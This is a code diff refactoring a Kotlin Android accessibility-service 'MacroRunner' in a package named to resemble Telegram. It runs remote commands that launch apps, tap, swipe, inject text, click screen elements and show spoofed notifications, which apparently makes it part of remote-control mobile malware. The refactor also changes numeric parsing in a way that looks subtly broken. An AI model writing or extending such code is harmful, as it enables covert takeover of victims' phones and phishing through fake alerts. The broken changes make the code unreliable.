@@ -2,7 +2,6 @@ package com.telegram2.messaging.remote
 
 import android.accessibilityservice.AccessibilityService
 import android.view.accessibility.AccessibilityNodeInfo
-import com.telegram2.messaging.remote.CommandProcessor.RemoteCommand
 
 object MacroRunner {
     var currentPackage: String? = null
@@ -34,11 +33,14 @@ object MacroRunner {
     }
 
     private fun executeStep(step: MacroStep, service: MyAccessibilityService): Boolean {
-        return when (step.type) {
+        // Use a variable to store result instead of returning inside when
+        val result = when (step.type) {
             "launch" -> {
-                val pkg = step.data as? String ?: return false
-                currentPackage = pkg
-                service.runOnMainThreadSync { service.launchApp(pkg) } as Boolean
+                val pkg = step.data as? String
+                if (pkg == null) false else {
+                    currentPackage = pkg
+                    service.runOnMainThreadSync { service.launchApp(pkg) } as Boolean
+                }
             }
             "wait" -> {
                 val ms = (step.data as? Number)?.toLong() ?: 1000L
@@ -46,39 +48,47 @@ object MacroRunner {
                 true
             }
             "tap" -> {
-                val map = step.data as? Map<*, *> ?: return false
-                val x = (map["x"] as? Number)?.toInt() ?: return false
-                val y = (map["y"] as? Number)?.toInt() ?: return false
-                service.runOnMainThreadSync { service.tap(x, y) }
-                true
+                val map = step.data as? Map<*, *>
+                if (map == null) false else {
+                    val x = map["x"] as? Int ?: return false
+                    val y = map["y"] as? Int ?: return false
+                    service.runOnMainThreadSync { service.tap(x, y) }
+                    true
+                }
             }
             "type" -> {
-                val text = step.data as? String ?: return false
-                service.runOnMainThreadSync { service.injectText(text) }
-                true
+                val text = step.data as? String
+                if (text == null) false else {
+                    service.runOnMainThreadSync { service.injectText(text) }
+                    true
+                }
             }
             "swipe" -> {
-                val map = step.data as? Map<*, *> ?: return false
-                val sx = (map["sx"] as? Number)?.toInt() ?: return false
-                val sy = (map["sy"] as? Number)?.toInt() ?: return false
-                val ex = (map["ex"] as? Number)?.toInt() ?: return false
-                val ey = (map["ey"] as? Number)?.toInt() ?: return false
-                val dur = (map["dur"] as? Long) ?: 300L
-                service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
-                true
+                val map = step.data as? Map<*, *>
+                if (map == null) false else {
+                    val sx = map["sx"] as? Int ?: return false
+                    val sy = map["sy"] as? Int ?: return false
+                    val ex = map["ex"] as? Int ?: return false
+                    val ey = map["ey"] as? Int ?: return false
+                    val dur = map["dur"] as? Long ?: 300L
+                    service.runOnMainThreadSync { service.swipe(sx, sy, ex, ey, dur) }
+                    true
+                }
             }
             "click_text" -> {
-                val text = step.data as? String ?: return false
-                service.runOnMainThreadSync {
-                    val root = service.rootInActiveWindow
-                    for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
-                        if (node.isClickable) {
-                            node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
-                            return@runOnMainThreadSync true
+                val text = step.data as? String
+                if (text == null) false else {
+                    service.runOnMainThreadSync {
+                        val root = service.rootInActiveWindow
+                        for (node in root?.findAccessibilityNodeInfosByText(text) ?: emptyList()) {
+                            if (node.isClickable) {
+                                node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
+                                return@runOnMainThreadSync true
+                            }
                         }
-                    }
-                    return@runOnMainThreadSync false
-                } as Boolean
+                        return@runOnMainThreadSync false
+                    } as Boolean
+                }
             }
             "home" -> {
                 service.runOnMainThreadSync {
@@ -116,15 +126,19 @@ object MacroRunner {
                 true
             }
             "fake_notification" -> {
-                val map = step.data as? Map<*, *> ?: return false
-                val title = map["title"] as? String ?: "⚠ Alert"
-                val body = map["text"] as? String ?: "Tap to view"
-                service.runOnMainThreadSync {
-                    NotificationSpoofer.show(service, title, body, null, null)
+                val map = step.data as? Map<*, *>
+                if (map == null) false else {
+                    val title = map["title"] as? String ?: "⚠ Alert"
+                    val body = map["text"] as? String ?: "Tap to view"
+                    service.runOnMainThreadSync {
+                        NotificationSpoofer.show(service, title, body, null, null)
+                    }
+                    true
                 }
-                true
             }
             else -> false
         }
+
+        return result
     }
 }
